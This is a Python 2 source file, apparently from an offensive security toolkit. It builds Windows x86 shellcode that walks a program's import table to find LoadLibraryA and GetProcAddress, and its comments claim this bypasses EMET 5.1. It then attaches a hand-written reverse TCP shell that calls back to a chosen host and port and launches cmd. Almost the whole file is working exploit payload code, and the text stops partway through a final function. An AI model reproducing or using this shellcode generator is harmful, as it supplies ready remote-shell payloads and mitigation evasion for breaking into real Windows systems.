#!/usr/bin/env python
# Created By Josh Pitts
# Edits By Casey Smith
# This modification Locates ADVAPI32, then LoadLibA, GetProcAddress from there. ;)
import struct
import sys
import pefile
import ntpath
import json


lla_hash_set = {}
gpa_hash_set = {}
lla_gpa_found = False
gpa_found = False

###############################
#Modified from Stephen Fewer's hash.py 
###############################

def ror(dword, bits):
    return (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF

def unicode(string, uppercase=True):
    result = ""
    if uppercase:
        string = string.upper()
    for c in string:
        result += c + "\x00"
    return result

def hash(module, bits=13, print_hash=True):
    module_hash = 0
    if len(module) < 12:
        module += "\x00" * (12 - len(module))
    if len(module) > 12:
        module += module[:12]
    for c in unicode(module):
        #print '\t', c.encode('hex')
        module_hash = ror(module_hash, bits)
        module_hash += ord(c)
    return module_hash

###############################
###############################

def find_apis(dll_set, os_system):
    locations = ['winXP', 'win7', 'win8', 'winVista', 'win10']
    ignore_dlls = ['api-ms-win', ]
    #ignore_dlls = []
    #goodtogo = {}
    loaded_modules = set()
    #dll_set.add('emet.dll')
    temp_set = dll_set
    if os_system.lower() == 'all':
        look_here = locations
    else:
        look_here = [os_system]

    for location in look_here:
        dll_set = temp_set
        #goodtogo[location] = {}

        print "[*] Checking %s compatibility" % location
        _location = './parser_output/' + location + '/output.json'
        #_included = './parser_output/' + location + '/included.json'
        all_dlls_dict = json.loads(open(_location, 'r').read())
        #included_dict = json.loads(open(_included, 'r').read())
        print "[*] Number of lookups to do:", len(all_dlls_dict)

        # get all loaded modules
        def recursive_parse(dll_set):
            # FML
            # list the dll that is imported by what dll
            # if it isn't already in the set print dll, imported name
            temp_lm = set()
            for dll in dll_set:
                print " [*] Checking for its imported DLLs:", dll
                for key, value in all_dlls_dict.iteritems():
                    if dll.lower() == ntpath.basename(key.lower()):
                        for lm in value['dlls']:
                            found = True
                            for ig_dll in ignore_dlls:
                                if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
                                    #print ig_dll.lower(), lm.lower()
                                    found = False
                            if found is True and lm not in temp_lm and lm not in dll_set:
                                print '\t[*]', dll, 'adds the following not already loaded dll:', lm

                                temp_lm.add(lm)

            return temp_lm

        temp_dict = {}
        while True:
            length = len(dll_set)
            temp_dict = recursive_parse(dll_set)
            dll_set = dll_set.union(temp_dict)
            if len(temp_dict) <= length:
                print "[*] Parsing imported dlls complete"
                break

        """for dll in dll_set:
            for key, value in all_dlls_dict.iteritems():
                if dll.lower() == ntpath.basename(key.lower()):
                    for lm in value['dlls']:
                        for ig_dll in ignore_dlls:
                            if ig_dll.lower().encode('utf-8') in lm.lower().encode('utf-8'):
                                #print ig_dll.lower(), lm.lower()
                                continue
                            else:
                                #print 'adding', lm
                                loaded_modules.add(lm)


        print "check2:", loaded_modules
        """

        print "[*] Possible useful loaded modules:", dll_set
        dllfound = False
        getprocaddress_dll = False
        blacklist = ['kernel32.dll', 'firewallapi.dll']
        for dll in dll_set:
            print '[*] Looking for loadliba/getprocaddr or just getprocaddr in %s' % dll

            dllfound = False
            getprocaddress_dll = False

            for key, value in all_dlls_dict.iteritems():
                #print dll.lower(), ntpath.basename(key.lower())
                if ntpath.basename(key.lower()) in blacklist:
                    continue
                if dll.lower() == ntpath.basename(key.lower()):
                    if value['getprocaddress'] is True:
                        #print "yes!"
                        if 'system32' in key.lower():
                            getprocaddress_dll = True
                            
                        elif 'program files' in key.lower():
                            getprocaddress_dll = True

                        if getprocaddress_dll is True:
                            print "\t-- GetProcAddress will work with this imported DLL:", key
                            gpa_hash_set[ntpath.basename(key.lower())] = hash(ntpath.basename(key.lower()))
                            getprocaddress_dll = False

                    if value['loadlibrarya'] is True and value['getprocaddress'] is True:

                        if 'system32' in key.lower():
                            dllfound = True
                            break
                        #elif 'windows' in key.lower():
                        #    dllfound = True
                        #    break
                        elif 'program files' in key.lower():
                            dllfound = True
                            break
                        #else:
                        #    dllfound = True

            if dllfound is True:
                #goodtogo[location][key] = value
                print "\t-- This imported DLL will work for LLA/GPA:", key
                lla_hash_set[ntpath.basename(key.lower())] = hash(ntpath.basename(key.lower()))
                #print key, value

        print "[*] LLA/GPA binaries available:", lla_hash_set
        print "[*] GPA binaries available:", gpa_hash_set
        print "*" * 80
        return lla_hash_set, gpa_hash_set


def check_apis(aFile, os_system):
    ####################################
    #### Parse imports via pefile ######

    #make this option only if a IAT based shellcode is selected
    print "[*] Loading PE in pefile"
    pe = pefile.PE(aFile, fast_load=True)
    print "[*] Parsing data directories"
    pe.parse_data_directories()
    apis = {}
    apis['neededAPIs'] = set()
    dlls = set()
    lla_gpa_found = False
    gpa_found = False

    try:
        for api in ['LoadLibraryA', 'GetProcAddress']:
            apiFound = False
            for entry in pe.DIRECTORY_ENTRY_IMPORT:
                dlls.add(entry.dll)
                for imp in entry.imports:
                    if imp.name is None:
                        continue
                    if imp.name.lower() == api.lower():
                        print "[*] Found API", api.lower()
                        apiFound = True
            
            if apiFound is False:
                apis['neededAPIs'].add(api)
            
    except Exception as e:
        print "Exception:", str(e)

    if apis['neededAPIs'] == set():
        print '[*] Both LLA/GPA APIs found!'
        lla_gpa_found = True
        gpa_found = True
    
    elif 'LoadLibraryA' in apis['neededAPIs']:
        print '[*] GetProcAddress API was found!'
        gpa_found = True
    
    return dlls, lla_gpa_found, gpa_found

def pack_ip_addresses(HOST):
        hostocts = []
        for i, octet in enumerate(HOST.split('.')):
                hostocts.append(int(octet))
        hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                             hostocts[2], hostocts[3])
        return hostip


def decision_tree(HOST, PORT, dlls, lla_gpa_found, gpa_found, os_system, FORCE_EMET, USE_LOADED_MODULE):
    
    if FORCE_EMET.lower() == "true" and USE_LOADED_MODULE.lower() == 'false':
            print "Forcing EMET.dll hash for use in IAT Loaded Module parser"
            # pass the EMET.dll hash to the function
            #shellcode = locate_hash1 + struct.pack("<I", 0xeb616ca5) + locate_hash2 + lla_gpa_parser + get_lla_gpa + shellcode5
            #print shellcode
            shellcode = loaded_iat_parser_stub(hash('EMET.dll')) + iat_rev_tcp_stub(HOST, PORT)
            return shellcode
    
    elif lla_gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
        print '[*] Using LLA/GPA IAT parsing stub'
        shellcode =  iat_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
        return shellcode

    elif gpa_found is True and USE_LOADED_MODULE.lower() == 'false':
        print '[*] Using GPA IAT parsing stub'
        shellcode = gpa_parser_stub() + iat_rev_tcp_stub(HOST, PORT)
        return shellcode


    else:
        
        lla_hash_set, gpa_hash_set = find_apis(dlls, os_system)
        
        if lla_hash_set == dict() and lla_hash_set != {}:
            print "[*] In lla_hash_set payload:", lla_hash_set
            DLL, a_hash = lla_hash_set.iteritems().next()
            print "[!] Using LLA/GPA DLL and hash", DLL, hex(a_hash)
            shellcode = loaded_iat_parser_stub(lla_hash_set.itervalues().next()) + iat_rev_tcp_stub(HOST, PORT)
            return shellcode
            # pass that hash to the function
        
        elif gpa_hash_set != dict():
            print "[*] Setting imported IAT GPA payload"
            DLL, a_hash = gpa_hash_set.iteritems().next()
            print "[!] Using GPA DLL and hash", DLL, hex(a_hash)
            
            shellcode = loaded_gpa_iat_parser_stub(gpa_hash_set.itervalues().next()) + iat_rev_tcp_stub(HOST, PORT)
            # use that
            return shellcode
        else:
            print "[!] You have no options..."
            print "\xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf"
            

        return shellcode

def iat_rev_tcp_stub(HOST, PORT):

    # hand written reverse TCP shellcode to build a payload from loadliba getprocaddr in EBX, ECX
    shellcode1 = ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68" +
                   "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                   "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\xFF\xD5\x68"
                   "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                   "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                   "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                   "\x95\x6A\x05\x68"
                   )
    shellcode1 += pack_ip_addresses(HOST)          # HOST
    shellcode1 += "\x68\x02\x00"
    shellcode1 += struct.pack('!h', PORT)      # PORT
    shellcode1 += ("\x89\xE2\x6A"
                   "\x10\x52\x51\x87\xF9\xFF\xD5"
                   )

    shellcode2 = ("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
                  "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                  "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                  "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
                  "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
                  "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
                  "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
                  "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
                  "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
                  #NOP below to continue execution
                  "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x90\x46\x89\xD4"
                  "\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00"
                  )

    return shellcode1 + shellcode2

def iat_parser_stub():
    """
        IAT parser based code:
        Idea from: http://phrack.org/issues/63/15.html
        Bypasses EMET 5.1
        LoadlibraryA and GetProcaddress IAT finder
    """
    
    shellcode = ( "\xfc"
                   "\x31\xd2"                      # xor edx, edx                          ;prep edx for use
                   "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
                   "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
                   "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
                   #"\x8b\xc3"                      # mov eax, ebx                         ;Set eax to imagebase
                   "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
                   "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
                   "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset

                   #findImport:
                   "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
                   "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
                   "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
                   "\x74\x05"                      # je 0x102f                             ;jmp saveBase
                   "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
                   "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport

                   #saveBase:
                   "\x57"                          # push edi                              ;save addr of import base
                   "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs

                   #setBounds:
                   #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
                   "\x8b\x57\x10"                  # mov edx, dword ptr [edi + 0x10]       ;Point to API name
                   "\x03\xd3"                      # add edx, ebx                          ;Adjust to in memory offset
                   "\x8b\x37"                      # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
                   "\x03\xf3"                      # add esi, ebx                          ;Adjust to in memory offset
                   "\x8b\xca"                      # mov ecx, edx                          ;Mov in memory offset to ecx
                   "\x81\xc1\x00\x00\xff\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                   "\x33\xed"                      # xor ebp, ebp                          ;Zero ebp for thunk offset

                   #findAPI:
                   "\x8b\x06"                      # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
                   "\x03\xc3"                      # add eax, ebx                          ;Find in memory offset
                   "\x83\xc0\x02"                  # add eax, 2                            ;Adjust to ASCII name start
                   "\x3b\xc8"                      # cmp ecx, eax                          ;Check if over bounds
                   "\x72\x18"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3b\xc2"                      # cmp eax, edx                          ;Check if under Named import
                   "\x72\x14"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3e\x8b\x7c\x24\x04"          # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
                   "\x39\x38"                      # cmp dword ptr [eax], edi              ;Check first 4 chars
                   "\x75\x0b"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\x3e\x8b\x7c\x24\x08"          # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
                   "\x39\x78\x08"                  # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
                   "\x75\x01"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\xc3"                          # ret                                   ;If a match, ret

                   #Increment:
                   "\x83\xc5\x04"                  # add ebp, 4                            ;inc offset
                   "\x83\xc6\x04"                  # add esi, 4                            ;inc to next name
                   "\xeb\xd5"                      # jmp 0x1043                            ;jmp findAPI

                   #loadAPIs
                   "\x68\x61\x72\x79\x41"          # push 0x41797261                       ;aryA (notice the 4 char jump between beginning)
                   "\x68\x4c\x6f\x61\x64"          # push 0x64616f4c                       ;Load
                   "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
                   "\x03\xd5"                      # add edx, ebp                          ;In memory offset of API thunk
                   "\x83\xc4\x08"                  # add ESP, 8                            ;Move stack to import base addr
                   #"\x5d"                          # pop ebp                              ;remove loadlibrary from stack
                   #"\x5d"                          # pop ebp                              ;...
                   #"\x33\xed"                      # xor ebp, ebp                         ;
                   "\x5f"                          # pop edi                               ;restore import base addr for parsing
                   "\x52"                          # push edx                              ;save LoadLibraryA thunk address on stack
                   "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                   "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
                   "\xe8\x9d\xff\xff\xff"          # call 0x1032                           ;call setBounds
                   "\x03\xd5"                      # add edx, ebp                          ;
                   "\x5d"                          # pop ebp                               ;
                   "\x5d"                          # pop ebp                               ;
                   "\x5b"                          # pop ebx                               ;Pop LoadlibraryA thunk addr into ebx
                   "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
                   )
                    # LOADLIBA in EBX
                    # GETPROCADDR in ECX
    return shellcode 

def gpa_parser_stub():
    shellcode = ( "\xfc"
                   "\x31\xd2"                      # xor edx, edx                          ;prep edx for use
                   "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
                   "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
                   "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
                   #"\x8b\xc3"                      # mov eax, ebx                         ;Set eax to imagebase
                   "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
                   "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
                   "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset

                   #findImport:
                   "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
                   "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
                   "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
                   "\x74\x05"                      # je 0x102f                             ;jmp saveBase
                   "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
                   "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport

                   #saveBase:
                   "\x57"                          # push edi                              ;save addr of import base
                   "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs

                   #setBounds:
                   #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
                   "\x8b\x57\x10"                  # mov edx, dword ptr [edi + 0x10]       ;Point to API name
                   "\x03\xd3"                      # add edx, ebx                          ;Adjust to in memory offset
                   "\x8b\x37"                      # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
                   "\x03\xf3"                      # add esi, ebx                          ;Adjust to in memory offset
                   "\x8b\xca"                      # mov ecx, edx                          ;Mov in memory offset to ecx
                   "\x81\xc1\x00\x00\xff\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                   "\x33\xed"                      # xor ebp, ebp                          ;Zero ebp for thunk offset

                   #findAPI:
                   "\x8b\x06"                      # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
                   "\x03\xc3"                      # add eax, ebx                          ;Find in memory offset
                   "\x83\xc0\x02"                  # add eax, 2                            ;Adjust to ASCII name start
                   "\x3b\xc8"                      # cmp ecx, eax                          ;Check if over bounds
                   "\x72\x18"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3b\xc2"                      # cmp eax, edx                          ;Check if under Named import
                   "\x72\x14"                      # jb 0x1066                             ;If not over, don't jump to increment
                   "\x3e\x8b\x7c\x24\x04"          # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
                   "\x39\x38"                      # cmp dword ptr [eax], edi              ;Check first 4 chars
                   "\x75\x0b"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\x3e\x8b\x7c\x24\x08"          # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
                   "\x39\x78\x08"                  # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
                   "\x75\x01"                      # jne 0x1066                            ;If not a match, jump to increment
                   "\xc3"                          # ret                                   ;If a match, ret

                   #Increment:
                   "\x83\xc5\x04"                  # add ebp, 4                            ;inc offset
                   "\x83\xc6\x04"                  # add esi, 4                            ;inc to next name
                   "\xeb\xd5"                      # jmp 0x1043                            ;jmp findAPI

                   #loadAPIs
                  
                   "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                   "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
                   "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
                   "\x03\xd5"                      # add edx, ebp                          ;
                   "\x5d"                          # pop ebp                               ;
                   "\x5d"                          # pop ebp                               ;
                   "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
                   )
                #GPA in ECX
    shellcode += "\x89\xCD" # mov ebp, ecx
    
    shellcode += ("\x31\xd2"                          # xor    edx,edx
                  "\x64\x8b\x52\x30"                  # mov    edx,DWORD PTR fs:[edx+0x30]
                  "\x8b\x52\x0c"                      # mov    edx,DWORD PTR [edx+0xc]
                  "\x8b\x52\x14"                      # mov    edx,DWORD PTR [edx+0x14]
                  "\x8b\x72\x28"                      # mov    esi,DWORD PTR [edx+0x28]
                  "\x6a\x18"                          # push   0x18
                  "\x59"                              # pop    ecx
                  "\x31\xff"                          # xor    edi,edi
                  "\x31\xc0"                          # xor    eax,eax
                  "\xac"                              # lods   al,BYTE PTR ds:[esi]
                  "\x3c\x61"                          # cmp    al,0x61
                  "\x7c\x02"                          # jl     0x20
                  "\x2c\x20"                          # sub    al,0x20
                  "\xc1\xcf\x0d"                      # ror    edi,0xd
                  "\x01\xc7"                          # add    edi,eax
                  "\xe2\xf0"                          # loop   0x17
                  "\x81\xff\x5b\xbc\x4a\x6a"          # cmp    edi,0x6a4abc5b
                  "\x8b\x5a\x10"                      # mov    ebx,DWORD PTR [edx+0x10]
                  "\x8b\x12"                          # mov    edx,DWORD PTR [edx]
                  "\x75\xdb"                          # jne    0xf
                  )

    # kernel32.dll in ebx
    shellcode  += ("\x6A\x00"                 # push 0
                   "\x68\x61\x72\x79\x41"     # push LoadLibraryA\x00
                   "\x68\x4c\x69\x62\x72"
                   "\x68\x4c\x6f\x61\x64" 
                   "\x54"                     # push esp
                   "\x53"                     # push ebx (kernerl32.dll handle)
                   "\x89\xE9"                 # mov ecx,ebp getprocaddr
                   "\xFF\x11"                 # call dword ptr [ecx]  # call dword ptr [ecx] 
                   "\x50"                     # push eax ; LLA in EAX
                   "\x89\xe3"                 # mov ebx, esp ; mov ptr to LLA in ebx
                   "\x87\xcd"                 # xchng ebx, esi
                   )
    # LOADLIBA in EBX
    # GETPROCADDR in ECX

    return shellcode

def loaded_iat_parser_stub(DLL_HASH):
    print "[*] HASH", hex(DLL_HASH)
    shellcode1 = (  # Locate ADVAPI32 via PEB Ldr.InMemoryOrderModuleList ref:http://blog.harmonysecurity.com/2009_06_01_archive.html
                 "\x90"                          # 00000001  90                nop
                 "\xfc"                         # 00000002  FC                cld
                 "\x31\xd2"                     # 00000003  31D2              xor edx,edx
                 "\x64\x8b\x52\x30"             # 00000005  648B5230          mov edx,[fs:edx+0x30]
                 "\x8b\x52\x0c"                 # 00000009  8B520C            mov edx,[edx+0xc]
                 "\x8b\x52\x14"                 # 0000000C  8B5214            mov edx,[edx+0x14]
                 # next_mod
                 "\x8b\x72\x28"                 # 0000000F  8B7228            mov esi,[edx+0x28]
                 "\x6a\x18"                     # 00000012  6A18              push byte +0x18
                 "\x59"                         # 00000014  59                pop ecx
                 "\x31\xff"                     # 00000015  31FF              xor edi,edi
                 # loop_modname
                 "\x31\xc0"                     # 00000017  31C0              xor eax,eax
                 "\xac"                         # 00000019  AC                lodsb
                 "\x3c\x61"                     # 0000001A  3C61              cmp al,0x61
                 "\x7c\x02"                     # 0000001C  7C02              jl 0x20
                 "\x2c\x20"                     # 0000001E  2C20              sub al,0x20
                 # not_lowercase
                 "\xc1\xcf\x0d"                 # 00000020  C1CF0D            ror edi,byte 0xd
                 "\x01\xc7"                     # 00000023  01C7              add edi,eax
                 "\xe2\xf0"                     # 00000025  E2F0              loop 0x17
                 # ADVAPI32.DLL Hash Computes To 0xc78a43f4 ; Add details on how hash is computed
                 # Options will work as follows:
                 # 1. APIs exist in IAT (don't look for modules)
                 # 2. In a loaded module exists an IAT.  Use that.
                 # 3. If EMET is in USE (for sure) and there is NO loaded module
                 #    that has loadliba/getprocaddr use advapi32.dll (in EMET)
                 )
                 #"\x81\xff\xf4\x43\x8a\xc7"     # 00000027  81FFF4438AC7      cmp edi,0xc78a43f4
                 
                 #KERNEL32.dll 0x6a4abc5b
                 #"\x81\xff\x5b\xbc\x4a\x6a"
                 
                 #shlwapi.dll 0xeb181366
                 #"\x81\xff\x66\x13\x18\xeb"
                 
                 # EMET.dll 0xeb616ca5
                 #"\x81\xFF\xa5\x6c\x61\xeb"
    
    shellcode2 = "\x81\xff"
    shellcode2 += struct.pack("<I", DLL_HASH)


    shellcode3 = ("\x8b\x5a\x10"                 # 0000002D  8B5A10            mov ebx,[edx+0x10]
                 "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
                 "\x75\xdb"                     # 00000032  75DB              jnz 0xf
                 # iatparser
                 "\x90"                         # 00000034  90                nop
                 "\x90"                         # 00000035  90                nop
                 "\x90"                         # 00000036  90                nop
                 "\x89\xda"                     # 00000037  89DA              mov edx,ebx
                 "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
                 "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
                 "\x01\xdf"                     # 00000042  01DF              add edi,ebx
                 # findImport
                 "\x90"                         # 00000044  90                nop
                 "\x90"                         # 00000045  90                nop
                 "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
                 "\x01\xda"                     # 00000049  01DA              add edx,ebx
                 "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
                 "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
                 "\x74\x05"                     # 00000058  7405              jz 0x5f
                 "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
                 "\xeb\xe5"                     # 0000005D  EBE5              jmp short 0x44
                 # saveBase
                 "\x57"                         # 0000005F  57                push edi
                 "\xeb\x3d"                     # 00000060  EB3D              jmp short 0x9f
                 # setbounds
                 "\x90"                         # 00000062  90                nop
                 "\x90"                         # 00000063  90                nop
                 "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
                 "\x01\xda"                     # 00000067  01DA              add edx,ebx
                 "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
                 "\x01\xde"                     # 0000006B  01DE              add esi,ebx
                 "\x89\xd1"                     # 0000006D  89D1              mov ecx,edx
                 # this can be set based on the size of the .data section of the exploted binary or
                 # for the exploited DLL ... 0xff0000 for now.
                 #"\x81\xc1\x00\x00\x04\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                    
                 "\x81\xc1\x00\x00\xff\x00"     # 0000006F  81C10000FF00      add ecx,0xff0000
                 
                 "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
                 # findApi
                 "\x90"                         # 00000077  90                nop
                 "\x90"                         # 00000078  90                nop
                 "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
                 "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
                 "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
                 "\x39\xc1"                     # 00000080  39C1              cmp ecx,eax
                 "\x72\x13"                     # 00000082  7213              jc 0x97
                 "\x8b\x7c\x24\x04"             # 00000084  8B7C2404          mov edi,[esp+0x4]
                 "\x39\x38"                     # 00000088  3938              cmp [eax],edi
                 "\x75\x0b"                     # 0000008A  750B              jnz 0x97
                 "\x3e\x8b\x7c\x24\x08"         # 0000008C  3E8B7C2408        mov edi,[ds:esp+0x8]
                 "\x39\x78\x08"                 # 00000091  397808            cmp [eax+0x8],edi
                 "\x75\x01"                     # 00000094  7501              jnz 0x97
                 "\xc3"                         # 00000096  C3                ret
                 # Increment
                 "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
                 "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
                 "\xeb\xd8"                     # 0000009D  EBD8              jmp short 0x77
                 # loadApis
                 "\x90"                         # 0000009F  90                nop
                 "\x90"                         # 000000A0  90                nop
                 "\x68\x61\x72\x79\x41"         # 000000A1  6861727941        push dword 0x41797261
                 "\x68\x4c\x6f\x61\x64"         # 000000A6  684C6F6164        push dword 0x64616f4c
                 "\xe8\xb2\xff\xff\xff"         # 000000AB  E8B2FFFFFF        call dword 0x62
                 "\x01\xea"                     # 000000B0  01EA              add edx,ebp
                 "\x83\xc4\x08"                 # 000000B2  83C408            add esp,byte +0x8
                 "\x5f"                         # 000000B5  5F                pop edi
                 "\x52"                         # 000000B6  52                push edx
                 "\x68\x64\x64\x72\x65"         # 000000B7  6864647265        push dword 0x65726464
                 "\x68\x47\x65\x74\x50"         # 000000BC  6847657450        push dword 0x50746547
                 "\xe8\x9c\xff\xff\xff"         # 000000C1  E89CFFFFFF        call dword 0x62
                 "\x01\xea"                     # 000000C6  01EA              add edx,ebp
                 "\x5d"                         # 000000C8  5D                pop ebp
                 "\x5d"                         # 000000C9  5D                pop ebp
                 "\x5b"                         # 000000CA  5B                pop ebx
                 "\x89\xd1"                     # 000000CB  89D1              mov ecx,edx
                )
               # LOADLIBA in EBX
               # GETPROCADDR in ECX

    return shellcode1 + shellcode2 + shellcode3

def loaded_gpa_iat_parser_stub(DLL_HASH):
    print "[*] HASH", hex(DLL_HASH)
    shellcode1 = (  # Locate ADVAPI32 via PEB Ldr.InMemoryOrderModuleList ref:http://blog.harmonysecurity.com/2009_06_01_archive.html
                 "\x90"                          # 00000001  90                nop
                 "\xfc"                         # 00000002  FC                cld
                 "\x31\xd2"                     # 00000003  31D2              xor edx,edx
                 "\x64\x8b\x52\x30"             # 00000005  648B5230          mov edx,[fs:edx+0x30]
                 "\x8b\x52\x0c"                 # 00000009  8B520C            mov edx,[edx+0xc]
                 "\x8b\x52\x14"                 # 0000000C  8B5214            mov edx,[edx+0x14]
                 # next_mod
                 "\x8b\x72\x28"                 # 0000000F  8B7228            mov esi,[edx+0x28]
                 "\x6a\x18"                     # 00000012  6A18              push byte +0x18
                 "\x59"                         # 00000014  59                pop ecx
                 "\x31\xff"                     # 00000015  31FF              xor edi,edi
                 # loop_modname
                 "\x31\xc0"                     # 00000017  31C0              xor eax,eax
                 "\xac"                         # 00000019  AC                lodsb
                 "\x3c\x61"                     # 0000001A  3C61              cmp al,0x61
                 "\x7c\x02"                     # 0000001C  7C02              jl 0x20
                 "\x2c\x20"                     # 0000001E  2C20              sub al,0x20
                 # not_lowercase
                 "\xc1\xcf\x0d"                 # 00000020  C1CF0D            ror edi,byte 0xd
                 "\x01\xc7"                     # 00000023  01C7              add edi,eax
                 "\xe2\xf0"                     # 00000025  E2F0              loop 0x17
                 # ADVAPI32.DLL Hash Computes To 0xc78a43f4 ; Add details on how hash is computed
                 # Options will work as follows:
                 # 1. APIs exist in IAT (don't look for modules)
                 # 2. In a loaded module exists an IAT.  Use that.
                 # 3. If EMET is in USE (for sure) and there is NO loaded module
                 #    that has loadliba/getprocaddr use advapi32.dll (in EMET)
                 )
                 #"\x81\xff\xf4\x43\x8a\xc7"     # 00000027  81FFF4438AC7      cmp edi,0xc78a43f4
                 
                 #KERNEL32.dll 0x6a4abc5b
                 #"\x81\xff\x5b\xbc\x4a\x6a"
                 
                 #shlwapi.dll 0xeb181366
                 #"\x81\xff\x66\x13\x18\xeb"
                 
                 # EMET.dll 0xeb616ca5
                 #"\x81\xFF\xa5\x6c\x61\xeb"
    
    shellcode2 = "\x81\xff"
    shellcode2 += struct.pack("<I", DLL_HASH)


